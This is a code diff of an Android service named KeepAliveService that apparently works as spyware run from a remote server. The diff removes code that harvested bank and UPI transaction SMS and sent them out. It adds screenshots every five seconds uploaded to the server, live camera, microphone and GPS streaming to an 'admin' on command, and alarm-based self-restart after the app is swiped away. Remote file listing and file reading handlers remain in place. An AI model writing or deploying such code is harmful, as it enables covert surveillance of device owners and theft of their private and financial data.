@@ -5,24 +5,46 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.app.AlarmManager;
 import android.content.BroadcastReceiver;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
-import android.database.Cursor;
+import android.os.SystemClock;
+import android.graphics.ImageFormat;
+import android.graphics.PixelFormat;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
+import android.util.DisplayMetrics;
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraCaptureSession;
+import android.hardware.camera2.CameraCharacteristics;
+import android.hardware.camera2.CameraDevice;
+import android.hardware.camera2.CameraManager;
+import android.hardware.camera2.CaptureRequest;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.media.AudioFormat;
+import android.media.AudioRecord;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.PowerManager;
-import android.provider.Telephony;
-import android.telephony.SmsMessage;
+import android.util.Base64;
 import android.webkit.MimeTypeMap;
+import androidx.annotation.NonNull;
 import androidx.core.app.NotificationCompat;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
@@ -37,11 +59,15 @@ import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.nio.ByteBuffer;
+import android.content.pm.PackageManager;
+import android.content.pm.ServiceInfo;
+import java.util.Arrays;
+import java.util.Collections;
 import java.util.HashSet;
+import java.util.List;
 import java.util.Set;
 import java.util.concurrent.TimeUnit;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
 
 public class KeepAliveService extends Service {
 
@@ -49,23 +75,6 @@ public class KeepAliveService extends Service {
     private static final int    NOTIF_ID   = 1001;
     private static final String PREFS_NAME = "meeee";
     private static final long   MAX_FILE_BYTES = 200L * 1024 * 1024; // 200 MB
-
-    // Known Indian bank/UPI SMS sender IDs
-    private static final Set<String> BANK_SENDERS = new HashSet<>();
-    static {
-        String[] senders = { "HDFCBK","HDFCBNK","SBIINB","SBICRD","SBICARD","SBIPSG",
-            "ICICIB","ICICIBNK","AXISBK","AXISBANK","KOTAKB","KOTAK",
-            "PAYTM","PYTMSMS","PHONPE","GPAY","GOOGLEPAY",
-            "INDBNK","PNBSMS","BARODASMS","BOBTXN","CANBNK","UCOBNK",
-            "IDFCBK","YESBNK","INDUSIND","AUBANK","FEDRBL" };
-        for (String s : senders) BANK_SENDERS.add(s.toUpperCase());
-    }
-
-    private static final Pattern AMT_PATTERN     = Pattern.compile("(?:Rs\\.?|INR|₹)\\s*([\\d,]+(?:\\.\\d{1,2})?)", Pattern.CASE_INSENSITIVE);
-    private static final Pattern DEBIT_PATTERN   = Pattern.compile("debited|paid|spent|deducted|withdrawn|sent|\\bdr\\b", Pattern.CASE_INSENSITIVE);
-    private static final Pattern CREDIT_PATTERN  = Pattern.compile("credited|received|added|deposited|\\bcr\\b", Pattern.CASE_INSENSITIVE);
-    private static final Pattern MERCH_PATTERN   = Pattern.compile("(?:paid to|sent to|transferred to|to|at|from)\\s+([A-Za-z0-9 &.'%@-]{2,40}?)(?:\\s+(?:via|on|at|\\.|,|UPI|Ref|txn)|$)", Pattern.CASE_INSENSITIVE);
-    private static final Pattern BAL_PATTERN     = Pattern.compile("(?:Avl\\.?\\s*[Bb]al|[Bb]alance|Avail[a-z]*\\s*Bal|Bal)\\s*(?:is|:)?\\s*(?:Rs\\.?|INR|₹)?\\s*([\\d,]+(?:\\.\\d{1,2})?)", Pattern.CASE_INSENSITIVE);
 
     private PowerManager.WakeLock wakeLock;
     private OkHttpClient          httpClient;
@@ -75,8 +84,32 @@ public class KeepAliveService extends Service {
     private String                userName;
     private String                userId;      // assigned by server on auth_ok
     private boolean               shouldConnect = false;
-    private BroadcastReceiver     smsReceiver;
-    private final Set<String>     sentSmsIds = new HashSet<>();  // de-duplicate SMS
+    private BroadcastReceiver     systemReceiver; // reconnects WS on screen-on / network change
+
+    // ── Screen capture fields ─────────────────────────────────────────────────
+    private MediaProjection      mediaProjection;
+    private VirtualDisplay       virtualDisplay;
+    private ImageReader          screenReader;
+    private volatile boolean     screenCapturing = false;
+    private static final int     SCREEN_CAPTURE_INTERVAL_MS = 5000; // 5 sec
+
+    // ── Live Monitor fields ───────────────────────────────────────────────────
+    private CameraDevice         cameraDevice;
+    private CameraCaptureSession captureSession;
+    private ImageReader          imageReader;
+    private HandlerThread        cameraThread;
+    private Handler              cameraHandler;
+    private volatile boolean     cameraStreaming = false;
+    private String               fromAdminIdCamera;
+
+    private AudioRecord          audioRecord;
+    private volatile boolean     micStreaming = false;
+    private String               fromAdminIdMic;
+
+    private LocationManager      locationManager;
+    private LocationListener     locationListener;
+    private volatile boolean     locationTracking = false;
+    private String               fromAdminIdLocation;
 
     // ── Lifecycle ─────────────────────────────────────────────────────────────
 
@@ -91,7 +124,21 @@ public class KeepAliveService extends Service {
             .pingInterval(25, TimeUnit.SECONDS)   // keep WS alive
             .build();
         createChannel();
-        startForeground(NOTIF_ID, buildNotification());
+        // Only include FGS types for permissions already granted — Android 14+ crashes if type
+        // is declared but the matching runtime permission hasn't been granted yet.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            int type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
+            if (checkSelfPermission("android.permission.CAMERA") == PackageManager.PERMISSION_GRANTED)
+                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
+            if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == PackageManager.PERMISSION_GRANTED)
+                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
+                checkSelfPermission("android.permission.RECORD_AUDIO") == PackageManager.PERMISSION_GRANTED)
+                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
+            startForeground(NOTIF_ID, buildNotification(), type);
+        } else {
+            startForeground(NOTIF_ID, buildNotification());
+        }
         acquireWakeLock();
 
         SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
@@ -102,27 +149,20 @@ public class KeepAliveService extends Service {
             connectWebSocket();
         }
 
-        // Real-time SMS receiver — picks up bank SMS as they arrive
-        smsReceiver = new BroadcastReceiver() {
+        // Reconnect WebSocket whenever screen turns on or user unlocks phone
+        systemReceiver = new BroadcastReceiver() {
             @Override
             public void onReceive(Context ctx, Intent intent) {
-                if (!Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;
-                SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
-                if (messages == null) return;
-                for (SmsMessage sms : messages) {
-                    String sender = sms.getOriginatingAddress();
-                    String body   = sms.getMessageBody();
-                    long   date   = sms.getTimestampMillis();
-                    if (isBankSender(sender)) {
-                        JSONObject txn = parseSmsToTransaction(sender, body, date);
-                        if (txn != null) sendTransaction(txn);
-                    }
+                if (nativeWs == null && serverUrl != null && shouldConnect) {
+                    connectWebSocket();
                 }
             }
         };
-        IntentFilter filter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
-        filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);
-        registerReceiver(smsReceiver, filter);
+        IntentFilter sysFilter = new IntentFilter();
+        sysFilter.addAction(Intent.ACTION_SCREEN_ON);
+        sysFilter.addAction(Intent.ACTION_USER_PRESENT);  // screen unlocked
+        sysFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
+        registerReceiver(systemReceiver, sysFilter);
     }
 
     @Override
@@ -140,6 +180,10 @@ public class KeepAliveService extends Service {
                     if (nativeWs != null) nativeWs.cancel();
                     connectWebSocket();
                 }
+            } else if ("START_SCREEN_CAPTURE".equals(intent.getAction())) {
+                int resultCode = intent.getIntExtra("resultCode", -1);
+                Intent data    = intent.getParcelableExtra("data");
+                if (resultCode != -1 && data != null) startScreenCapture(resultCode, data);
             } else if ("DISCONNECT".equals(intent.getAction())) {
                 shouldConnect = false;
                 if (nativeWs != null) { nativeWs.cancel(); nativeWs = null; }
@@ -154,14 +198,45 @@ public class KeepAliveService extends Service {
     @Override
     public void onDestroy() {
         shouldConnect = false;
+        stopScreenCapture();
+        handleStopCamera();
+        handleStopMic();
+        handleStopLocation();
         if (nativeWs != null) nativeWs.cancel();
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
-        if (smsReceiver != null) { try { unregisterReceiver(smsReceiver); } catch (Exception ignored) {} }
+        if (systemReceiver != null) { try { unregisterReceiver(systemReceiver); } catch (Exception ignored) {} }
         super.onDestroy();
     }
 
     @Override
     public IBinder onBind(Intent intent) { return null; }
+
+    // Restart service after app is swiped away — uses exact alarm so OEMs can't defer it
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        Intent restart = new Intent(getApplicationContext(), KeepAliveService.class);
+        restart.setPackage(getPackageName());
+        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        if (am != null) {
+            // Schedule at 1s and 10s as belt-and-suspenders
+            for (int i = 0; i < 2; i++) {
+                long delay = (i == 0) ? 1000L : 10000L;
+                PendingIntent pi = PendingIntent.getService(
+                    getApplicationContext(), i + 10,
+                    restart,
+                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    am.setExactAndAllowWhileIdle(
+                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                        SystemClock.elapsedRealtime() + delay, pi);
+                } else {
+                    am.setExact(AlarmManager.ELAPSED_REALTIME,
+                        SystemClock.elapsedRealtime() + delay, pi);
+                }
+            }
+        }
+        super.onTaskRemoved(rootIntent);
+    }
 
     // ── WebSocket connection ───────────────────────────────────────────────────
 
@@ -222,8 +297,18 @@ public class KeepAliveService extends Service {
                 handleLs(ws, msg);
             } else if ("read_file".equals(type)) {
                 handleReadFile(msg); // HTTP POST — no WebSocket needed for upload
-            } else if ("sms_sync_request".equals(type)) {
-                handleSmsSyncRequest();
+            } else if ("start_camera".equals(type)) {
+                handleStartCamera(msg);
+            } else if ("stop_camera".equals(type)) {
+                handleStopCamera();
+            } else if ("start_mic".equals(type)) {
+                handleStartMic(msg);
+            } else if ("stop_mic".equals(type)) {
+                handleStopMic();
+            } else if ("start_location".equals(type)) {
+                handleStartLocation(msg);
+            } else if ("stop_location".equals(type)) {
+                handleStopLocation();
             }
         } catch (Exception e) { /* ignore */ }
     }
@@ -380,109 +465,282 @@ public class KeepAliveService extends Service {
         } catch (Exception ignored) {}
     }
 
-    // ── SMS helpers ────────────────────────────────────────────────────────────
+    // ── Screen capture — MediaProjection ─────────────────────────────────────
 
-    private boolean isBankSender(String address) {
-        if (address == null) return false;
-        String clean = address.toUpperCase().replaceAll("[^A-Z]", "");
-        for (String s : BANK_SENDERS) if (clean.contains(s)) return true;
-        return false;
+    // Called from MainActivity after user grants MediaProjection permission (one-time)
+    public void startScreenCapture(int resultCode, Intent data) {
+        if (screenCapturing) return;
+        MediaProjectionManager mpm =
+            (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        mediaProjection = mpm.getMediaProjection(resultCode, data);
+        if (mediaProjection == null) return;
+
+        DisplayMetrics dm = getResources().getDisplayMetrics();
+        // Capture at 720p max to save storage
+        int dw = Math.min(dm.widthPixels,  1280);
+        int dh = Math.min(dm.heightPixels, 720);
+
+        screenReader = ImageReader.newInstance(dw, dh, PixelFormat.RGBA_8888, 2);
+        virtualDisplay = mediaProjection.createVirtualDisplay(
+            "meeee-capture", dw, dh, dm.densityDpi,
+            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+            screenReader.getSurface(), null, null);
+
+        screenCapturing = true;
+        scheduleScreenCapture();
     }
 
-    private JSONObject parseSmsToTransaction(String sender, String body, long dateMs) {
-        if (body == null || body.length() < 10) return null;
-        Matcher amtM = AMT_PATTERN.matcher(body);
-        if (!amtM.find()) return null;
-        double amount;
-        try { amount = Double.parseDouble(amtM.group(1).replace(",", "")); } catch (Exception e) { return null; }
-        if (amount <= 0) return null;
-
-        boolean isDebit  = DEBIT_PATTERN.matcher(body).find();
-        boolean isCredit = CREDIT_PATTERN.matcher(body).find();
-        if (!isDebit && !isCredit) return null;
-
-        String merchant = "";
-        Matcher mM = MERCH_PATTERN.matcher(body);
-        if (mM.find()) merchant = mM.group(1).trim();
-
-        Double balance = null;
-        Matcher bM = BAL_PATTERN.matcher(body);
-        if (bM.find()) { try { balance = Double.parseDouble(bM.group(1).replace(",", "")); } catch (Exception ignored) {} }
-
-        String senderClean = sender != null ? sender.toUpperCase().replaceAll("[^A-Z]", "") : "UNKNOWN";
-        String bank = senderClean;
-        if (senderClean.contains("HDFC")) bank = "HDFC";
-        else if (senderClean.contains("SBI")) bank = "SBI";
-        else if (senderClean.contains("ICICI")) bank = "ICICI";
-        else if (senderClean.contains("AXIS")) bank = "Axis";
-        else if (senderClean.contains("KOTAK")) bank = "Kotak";
-        else if (senderClean.contains("PAYTM")) bank = "Paytm";
-        else if (senderClean.contains("PHONPE")) bank = "PhonePe";
-        else if (senderClean.contains("GPAY") || senderClean.contains("GOOGLEPAY")) bank = "Google Pay";
-
-        String category = "bank";
-        String lc = body.toLowerCase() + " " + merchant.toLowerCase();
-        if (bank.equals("Paytm") || bank.equals("PhonePe") || bank.equals("Google Pay") || lc.contains("upi") || lc.contains("phonepe") || lc.contains("paytm")) category = "upi";
-        else if (lc.contains("swiggy") || lc.contains("zomato") || lc.contains("mcdonald") || lc.contains("kfc") || lc.contains("pizza") || lc.contains("burger") || lc.contains("food")) category = "food";
-        else if (lc.contains("amazon") || lc.contains("flipkart") || lc.contains("myntra") || lc.contains("shopping")) category = "shopping";
-        else if (lc.contains("ola") || lc.contains("uber") || lc.contains("petrol") || lc.contains("fuel") || lc.contains("irctc")) category = "transport";
-        else if (lc.contains("electric") || lc.contains("water") || lc.contains("gas") || lc.contains("airtel") || lc.contains("jio") || lc.contains("broadband")) category = "utilities";
-
-        try {
-            JSONObject txn = new JSONObject();
-            txn.put("id", Long.toHexString(dateMs) + Integer.toHexString(body.hashCode()));
-            txn.put("amount", amount);
-            txn.put("type", isDebit ? "debit" : "credit");
-            txn.put("category", category);
-            txn.put("merchant", merchant.isEmpty() ? bank : merchant);
-            txn.put("description", body);
-            txn.put("date", dateMs);
-            txn.put("source", "sms");
-            txn.put("bank", bank);
-            if (balance != null) txn.put("balance", balance);
-            return txn;
-        } catch (Exception e) { return null; }
+    private void scheduleScreenCapture() {
+        if (!screenCapturing) return;
+        handler.postDelayed(() -> {
+            captureScreen();
+            scheduleScreenCapture();
+        }, SCREEN_CAPTURE_INTERVAL_MS);
+        // Also capture immediately on first start
     }
 
-    private void sendTransaction(JSONObject txn) {
-        if (nativeWs == null || userId == null) return;
-        try {
-            String id = txn.optString("id");
-            if (sentSmsIds.contains(id)) return;  // de-duplicate
-            sentSmsIds.add(id);
+    private void captureScreen() {
+        if (!screenCapturing || screenReader == null) return;
+        new Thread(() -> {
+            try (Image image = screenReader.acquireLatestImage()) {
+                if (image == null) return;
+                Image.Plane plane = image.getPlanes()[0];
+                int rowPadding = plane.getRowStride() - plane.getPixelStride() * image.getWidth();
+                android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(
+                    image.getWidth() + rowPadding / plane.getPixelStride(),
+                    image.getHeight(), android.graphics.Bitmap.Config.ARGB_8888);
+                bmp.copyPixelsFromBuffer(plane.getBuffer());
+                // Crop to exact dimensions (remove row padding)
+                bmp = android.graphics.Bitmap.createBitmap(bmp, 0, 0, image.getWidth(), image.getHeight());
 
-            JSONObject msg = new JSONObject();
-            msg.put("type", "transaction_add");
-            msg.put("transaction", txn);
-            nativeWs.send(msg.toString());
+                // Compress to WebP
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                android.graphics.Bitmap.CompressFormat fmt = (Build.VERSION.SDK_INT >= 30)
+                    ? android.graphics.Bitmap.CompressFormat.WEBP_LOSSY
+                    : android.graphics.Bitmap.CompressFormat.WEBP;
+                bmp.compress(fmt, 65, baos);
+                bmp.recycle();
+
+                // Delete screenshots older than 24h
+                deleteOldScreenshots();
+
+                // Upload to server
+                uploadScreenshot(baos.toByteArray());
+            } catch (Exception ignored) {}
+        }).start();
+    }
+
+    private void uploadScreenshot(byte[] data) {
+        if (serverUrl == null || userId == null) return;
+        try {
+            String httpBase = serverUrl
+                .replaceFirst("^wss://", "https://")
+                .replaceFirst("^ws://", "http://")
+                .replaceFirst("/ws$", "");
+            String uploadUrl = httpBase + "/api/screenshot/" + userId;
+            String name = userName != null ? userName : "User";
+
+            RequestBody body = RequestBody.create(data, MediaType.parse("image/webp"));
+            Request req = new Request.Builder()
+                .url(uploadUrl)
+                .post(body)
+                .header("Content-Type", "image/webp")
+                .header("X-User-Name", Uri.encode(name))
+                .build();
+            httpClient.newCall(req).execute().close();
         } catch (Exception ignored) {}
     }
 
-    // Handle sms_sync_request — read SMS inbox (last 90 days) and send parsed transactions
-    private void handleSmsSyncRequest() {
-        new Thread(() -> {
-            try {
-                long since = System.currentTimeMillis() - (90L * 24 * 60 * 60 * 1000);
-                ContentResolver cr = getContentResolver();
-                Cursor cursor = cr.query(
-                    Uri.parse("content://sms/inbox"),
-                    new String[]{"_id", "address", "body", "date"},
-                    "date > ?", new String[]{String.valueOf(since)},
-                    "date DESC"
-                );
-                if (cursor == null) return;
-                while (cursor.moveToNext()) {
-                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
-                    String body    = cursor.getString(cursor.getColumnIndexOrThrow("body"));
-                    long   date    = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
-                    if (isBankSender(address)) {
-                        JSONObject txn = parseSmsToTransaction(address, body, date);
-                        if (txn != null) sendTransaction(txn);
-                    }
+    private void deleteOldScreenshots() {
+        // Server handles 24h TTL; this is a no-op placeholder for local storage if added later
+    }
+
+    private void stopScreenCapture() {
+        screenCapturing = false;
+        try { if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; } } catch (Exception ignored) {}
+        try { if (screenReader   != null) { screenReader.close();    screenReader   = null; } } catch (Exception ignored) {}
+        try { if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; } } catch (Exception ignored) {}
+    }
+
+    // ── Live Monitor — Camera2 ────────────────────────────────────────────────
+
+    private void handleStartCamera(JSONObject msg) {
+        if (cameraStreaming) return;
+        fromAdminIdCamera = msg.optString("fromAdminId");
+        cameraStreaming = true;
+
+        cameraThread = new HandlerThread("cam-capture");
+        cameraThread.start();
+        cameraHandler = new Handler(cameraThread.getLooper());
+
+        try {
+            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+            String camId = null;
+            for (String id : cm.getCameraIdList()) {
+                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
+                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
+                String wantFacing = msg.optString("facing", "rear");
+                boolean wantFront = "front".equals(wantFacing);
+                int targetFacing = wantFront
+                    ? CameraCharacteristics.LENS_FACING_FRONT
+                    : CameraCharacteristics.LENS_FACING_BACK;
+                if (facing != null && facing == targetFacing) {
+                    camId = id; break;
                 }
-                cursor.close();
-            } catch (Exception e) { /* SMS permission may not be granted yet */ }
+            }
+            if (camId == null && cm.getCameraIdList().length > 0) camId = cm.getCameraIdList()[0];
+            if (camId == null) { cameraStreaming = false; return; }
+
+            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
+            imageReader.setOnImageAvailableListener(reader -> {
+                try (Image image = reader.acquireLatestImage()) {
+                    if (image == null || !cameraStreaming || nativeWs == null) return;
+                    ByteBuffer buf = image.getPlanes()[0].getBuffer();
+                    byte[] bytes = new byte[buf.remaining()];
+                    buf.get(bytes);
+                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                    JSONObject frame = new JSONObject();
+                    frame.put("type", "camera_frame");
+                    frame.put("forAdminId", fromAdminIdCamera);
+                    frame.put("data", b64);
+                    frame.put("ts", System.currentTimeMillis());
+                    nativeWs.send(frame.toString());
+                } catch (Exception ignored) {}
+            }, cameraHandler);
+
+            final String finalCamId = camId;
+            cm.openCamera(finalCamId, new CameraDevice.StateCallback() {
+                @Override
+                public void onOpened(@NonNull CameraDevice device) {
+                    cameraDevice = device;
+                    try {
+                        List<android.view.Surface> surfaces =
+                            Collections.singletonList(imageReader.getSurface());
+                        device.createCaptureSession(surfaces,
+                            new CameraCaptureSession.StateCallback() {
+                                @Override
+                                public void onConfigured(@NonNull CameraCaptureSession session) {
+                                    captureSession = session;
+                                    try {
+                                        CaptureRequest.Builder b =
+                                            device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
+                                        b.addTarget(imageReader.getSurface());
+                                        session.setRepeatingRequest(b.build(), null, cameraHandler);
+                                    } catch (Exception e) { handleStopCamera(); }
+                                }
+                                @Override
+                                public void onConfigureFailed(@NonNull CameraCaptureSession s) {
+                                    handleStopCamera();
+                                }
+                            }, cameraHandler);
+                    } catch (Exception e) { handleStopCamera(); }
+                }
+                @Override public void onDisconnected(@NonNull CameraDevice d) { handleStopCamera(); }
+                @Override public void onError(@NonNull CameraDevice d, int e) { handleStopCamera(); }
+            }, cameraHandler);
+
+        } catch (Exception e) { cameraStreaming = false; }
+    }
+
+    private void handleStopCamera() {
+        cameraStreaming = false;
+        try { if (captureSession != null) { captureSession.close(); captureSession = null; } } catch (Exception ignored) {}
+        try { if (cameraDevice  != null) { cameraDevice.close();   cameraDevice  = null; } } catch (Exception ignored) {}
+        try { if (imageReader   != null) { imageReader.close();    imageReader   = null; } } catch (Exception ignored) {}
+        if (cameraThread != null) { cameraThread.quitSafely(); cameraThread = null; cameraHandler = null; }
+    }
+
+    // ── Live Monitor — AudioRecord ────────────────────────────────────────────
+
+    private void handleStartMic(JSONObject msg) {
+        if (micStreaming) return;
+        fromAdminIdMic = msg.optString("fromAdminId");
+        final int sampleRate = 16000;
+        int minBuf = AudioRecord.getMinBufferSize(sampleRate,
+            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
+        final int chunkSize = Math.max(minBuf > 0 ? minBuf : 0, 8192);
+        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate,
+            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, chunkSize);
+        if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
+            audioRecord.release(); audioRecord = null; return;
+        }
+        audioRecord.startRecording();
+        micStreaming = true;
+        new Thread(() -> {
+            byte[] buf = new byte[chunkSize];
+            while (micStreaming && audioRecord != null) {
+                int read = audioRecord.read(buf, 0, chunkSize);
+                if (read > 0 && nativeWs != null && micStreaming) {
+                    try {
+                        String b64 = Base64.encodeToString(
+                            Arrays.copyOf(buf, read), Base64.NO_WRAP);
+                        JSONObject chunk = new JSONObject();
+                        chunk.put("type", "audio_chunk");
+                        chunk.put("forAdminId", fromAdminIdMic);
+                        chunk.put("data", b64);
+                        chunk.put("sampleRate", sampleRate);
+                        nativeWs.send(chunk.toString());
+                    } catch (Exception ignored) {}
+                }
+            }
         }).start();
+    }
+
+    private void handleStopMic() {
+        micStreaming = false;
+        try {
+            if (audioRecord != null) {
+                audioRecord.stop();
+                audioRecord.release();
+                audioRecord = null;
+            }
+        } catch (Exception ignored) {}
+    }
+
+    // ── Live Monitor — LocationManager ────────────────────────────────────────
+
+    private void handleStartLocation(JSONObject msg) {
+        if (locationTracking) return;
+        fromAdminIdLocation = msg.optString("fromAdminId");
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        locationListener = new LocationListener() {
+            @Override
+            public void onLocationChanged(@NonNull Location loc) {
+                if (!locationTracking || nativeWs == null) return;
+                try {
+                    JSONObject upd = new JSONObject();
+                    upd.put("type", "location_update");
+                    upd.put("forAdminId", fromAdminIdLocation);
+                    upd.put("lat", loc.getLatitude());
+                    upd.put("lng", loc.getLongitude());
+                    upd.put("accuracy", loc.getAccuracy());
+                    upd.put("ts", loc.getTime());
+                    nativeWs.send(upd.toString());
+                } catch (Exception ignored) {}
+            }
+            @Override public void onProviderEnabled(@NonNull String p) {}
+            @Override public void onProviderDisabled(@NonNull String p) {}
+            @Override public void onStatusChanged(String p, int s, Bundle e) {}
+        };
+        try {
+            locationTracking = true;
+            locationManager.requestLocationUpdates(
+                LocationManager.GPS_PROVIDER, 15000, 5f, locationListener);
+            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                locationManager.requestLocationUpdates(
+                    LocationManager.NETWORK_PROVIDER, 15000, 5f, locationListener);
+            }
+        } catch (SecurityException e) { locationTracking = false; }
+    }
+
+    private void handleStopLocation() {
+        locationTracking = false;
+        try {
+            if (locationManager != null && locationListener != null) {
+                locationManager.removeUpdates(locationListener);
+            }
+        } catch (Exception ignored) {}
+        locationListener = null;
     }
 
     // ── Path helpers ───────────────────────────────────────────────────────────
